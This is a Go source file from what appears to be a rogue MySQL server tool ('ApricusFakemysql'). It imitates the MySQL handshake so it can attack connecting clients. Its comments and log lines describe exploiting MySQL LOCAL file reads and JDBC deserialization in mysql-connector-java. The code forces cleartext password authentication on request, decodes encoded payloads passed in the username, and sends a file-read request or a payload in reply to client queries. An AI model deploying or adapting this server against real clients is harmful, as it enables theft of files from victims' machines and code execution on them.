package conn

import (
	"ApricusFakemysql/core/Encoder"
	"ApricusFakemysql/core/proto"
	"ApricusFakemysql/core/utils"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
)

var wg sync.WaitGroup
var QueryData []byte
var ClientR *ClientResp
var Username string
var OK = []byte{0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00}
var EOF = []byte{0xfe, 0x00, 0x00, 0x02, 0x00}
var MysqlVersion string

// MysqlConnectWorker 使用于mysql的local读取利用和jdbc的反序列化利用
func MysqlConnectWorker(clientSocket net.Conn) {
	defer clientSocket.Close()
	defer wg.Done()

	// 获取客户端的地址信息
	clientAddr := clientSocket.RemoteAddr().String()
	fmt.Println("Accepted connection from:", clientAddr)

	PostClientData(clientSocket, proto.NewPacket(0, proto.NewGreetingMessage()))
	ClientPostFirstData := GetClientData(clientSocket)
	//客户端收到greeting后发送身份验证消息，等待server返回200
	SwitchClear, Usernamed := utils.CheckAndRemove(GetUsername(ClientPostFirstData), "@clear")
	IfEncode, EncodeString := utils.CheckAndRemove(Usernamed, "Encode=")

	if IfEncode {
		EncodeThing := strings.Split(EncodeString, ":")
		if len(EncodeThing) != 2 {
			log.Fatal("Wrong Encode Type")
		}
		Username = Encoder.DecodeLoader(EncodeThing[0], EncodeThing[1])
	} else {
		Username = Usernamed
	}

	AuthPlugin := GetAuthPlugin(ClientPostFirstData)
	if AuthPlugin != "mysql_clear_password" && SwitchClear {
		log.Print("switch to Auth Plugin to mysql_clear_password model")
		SwitchClientAuthPluginData := proto.NewPacket(2, []byte{0xfe, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x63, 0x6c, 0x65, 0x61, 0x72, 0x5f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x00})
		PostClientData(clientSocket, SwitchClientAuthPluginData)
		GetClientData(clientSocket)
		ServerValidData := proto.NewPacket(4, OK)
		PostClientData(clientSocket, ServerValidData)
	} else {
		ServerValidData := proto.NewPacket(2, OK)
		PostClientData(clientSocket, ServerValidData)
	}
	for {
		QueryData = GetClientData(clientSocket)
		if len(QueryData) == 0 {
			break
		}
		ClientR = NewClientResp(QueryData)
		if ClientR.Command == 0 {
			break
		}

		MysqlFileRead(Username, clientSocket)
		if ClientR.Command == 3 {
			if strings.Contains(ClientR.Statement, "SHOW VARIABLES") {
				log.Print("Get JDBC SHOW VARIABLES")
				IfMayMysqlConnect, MysqlVersion := utils.ExtractMySQLVersion(ClientR.Statement)
				if IfMayMysqlConnect {
					log.Print("Attack Target mysql-connector-java Version:" + MysqlVersion)
				}
				PostClientData(clientSocket, proto.NewPacket(1, []byte{0x02}))
				PostClientData(clientSocket, proto.NewPacket(2, proto.NewOptionByte("d")))
				PostClientData(clientSocket, proto.NewPacket(3, proto.NewOptionByte("e")))
				PostClientData(clientSocket, proto.NewPacket(5, EOF))
				PostClientData(clientSocket, proto.NewPacket(6, proto.NewOptionBytes([][]byte{[]byte("max_allowed_packet"), []byte("67108864")})))
				PostClientData(clientSocket, proto.NewPacket(7, proto.NewOptionBytes([][]byte{[]byte("system_time_zone"), []byte("UTC")})))
				PostClientData(clientSocket, proto.NewPacket(8, proto.NewOptionBytes([][]byte{[]byte("time_zone"), []byte("SYSTEM")})))
				PostClientData(clientSocket, proto.NewPacket(9, proto.NewOptionBytes([][]byte{[]byte("init_connect"), []byte("")})))
				PostClientData(clientSocket, proto.NewPacket(10, proto.NewOptionBytes([][]byte{[]byte("auto_increment_increment"), []byte("1")})))
				PostClientData(clientSocket, proto.NewPacket(11, EOF))
			} else {
				if MysqlVersion != "" && utils.StartsWith(MysqlVersion, "8") {
					if strings.Contains(strings.ToUpper(ClientR.Statement), "SHOW SESSION STATUS") {
						Payload(Username, clientSocket)
					} else {
						PostClientData(clientSocket, proto.NewPacket(0, OK))
					}
				} else {
					Payload(Username, clientSocket)
				}
			}
		} else {
			PostClientData(clientSocket, proto.NewPacket(1, OK))
		}
	}
}

func Start() {

	listener, err := net.Listen("tcp", "localhost:3306")
	if err != nil {
		log.Fatal("Error starting the server:", err)
	}
	defer listener.Close()

	fmt.Println("MySQL server started")

	// 接受客户端连接并处理
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Error accepting client connection:", err)
			continue
		}
		// 每个客户端连接启动一个goroutine进行处理
		wg.Add(1)
		go MysqlConnectWorker(conn)
	}

	// 等待所有连接处理完成
	wg.Wait()
}
